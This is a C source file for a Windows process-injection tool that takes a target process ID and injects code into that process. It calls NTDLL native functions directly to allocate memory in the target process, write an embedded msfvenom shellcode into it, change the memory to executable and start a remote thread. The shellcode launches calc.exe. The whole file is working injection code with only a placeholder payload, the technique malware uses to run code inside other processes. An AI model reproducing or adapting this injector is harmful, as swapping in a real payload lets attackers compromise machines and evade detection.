#include "Headers.h"

int main(int argc, char* argv[]) {

	if (argc < 2) {
		printf("[!] Usage: Pirivuzhalgiren.exe <PID>\n");
		return EXIT_FAILURE;
	}
	
	DWORD PID = atoi(argv[1]);
	printf("[+] PID: %ld\n", PID);

	HMODULE hModule = GetModuleHandleW(L"NTDLL");
	if (hModule == NULL) {
		printf("[!] Failed to get an handle to NTDLL.DLL! Exiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] Got an handle to NTDLL.DLL\n\t\\----0x%p\n", hModule);

	NTSTATUS status;
	unsigned char shellcode[] =
  //calc.exe shellcode generated using msfvenom 
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

	size_t shellcodesize = sizeof(shellcode);
	size_t byteswritten = NULL;

	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	PVOID rBuffer = NULL;
	DWORD oldprotect = NULL;
	OBJECT_ATTRIBUTES ObjAttributes = {sizeof(ObjAttributes), NULL};
	CLIENT_ID clientid = { 0 };
	clientid.UniqueProcess = (HANDLE)PID;

	NtOpenProcess PirivuOpenProcess = (NtOpenProcess)GetProcAddress(hModule, "NtOpenProcess");
	printf("[+] Got NtOpenProcess()\n");

	NtAllocateVirtualMemory PirivuAllocateVirtualMemory = (NtAllocateVirtualMemory)GetProcAddress(hModule, "NtAllocateVirtualMemory");
	printf("[+] Got NtAllocateVirtualMemory()\n");

	NtWriteVirtualMemory PirivuWriteMemory = (NtWriteVirtualMemory)GetProcAddress(hModule, "NtWriteVirtualMemory");
	printf("[+] Got NtWriteVirtualMemory()\n");

	NtProtectVirtualMemory PirivuVirtualProtect = (NtProtectVirtualMemory)GetProcAddress(hModule, "NtProtectVirtualMemory");
	printf("[+] Got NtProtectVirtualmemory()\n");

	NtCreateThreadEx PirivuCreateThreadEx = (NtCreateThreadEx)GetProcAddress(hModule, "NtCreateThreadEx");
	printf("[+] Got NtCreateThreadEx()\n");

	status = PirivuOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &ObjAttributes, &clientid);
	if (status != STATUS_SUCCESS) {
		printf("[!] Failed to Open Process! Exiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] Got an handle on target process!\n");

	status = PirivuAllocateVirtualMemory(hProcess, &rBuffer, NULL, &shellcodesize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
	if (status != STATUS_SUCCESS) {
		printf("[!] Failed to allocate memory! Exiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] Memory allocation successfull\n\t\\----0x%p\n", rBuffer);

	status = PirivuWriteMemory(hProcess, rBuffer, shellcode, sizeof(shellcode), &byteswritten);
	if (status != STATUS_SUCCESS) {
		printf("[!] Failed to write shellcode into memoru! Exiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] Shellcode written into memory.\n\t\\----0x%p\n", shellcode);

	status = PirivuVirtualProtect(hProcess, &rBuffer, &shellcodesize, PAGE_EXECUTE_READ, &oldprotect);
	if (status != STATUS_SUCCESS) {
		printf("[!] Failed to change the memory protection! Exiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] Memory protection changed from PAGE_READ_WRITE to PAGE_EXECUTE_READ\n");

	status = PirivuCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &ObjAttributes, hProcess, rBuffer, NULL, 0, NULL, NULL, NULL, NULL);
	if (status != STATUS_SUCCESS) {
		printf("[!] Failed to create thread! Exiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] Created thread!\n");
	printf("[+] Shellcode executed successfully!\n");

	WaitForSingleObject(hThread, INFINITE);

	CloseHandle(hThread);
	CloseHandle(hProcess);

	return EXIT_SUCCESS;
	
}
